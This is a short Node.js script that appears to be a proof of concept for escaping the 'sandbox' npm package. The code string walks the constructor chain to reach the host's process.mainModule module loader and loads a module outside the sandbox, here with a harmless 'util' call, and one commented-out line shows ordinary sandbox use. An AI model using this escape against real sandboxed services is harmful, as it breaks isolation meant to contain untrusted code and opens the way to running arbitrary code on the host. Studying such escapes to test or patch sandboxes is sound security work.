const Sandbox = require("sandbox");
var s = new Sandbox();
var code = `new Function("return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())")()("util").inspect("hi")`;
s.run(code);
// ordinary code
//s.run('1 + 1 + " apples"');
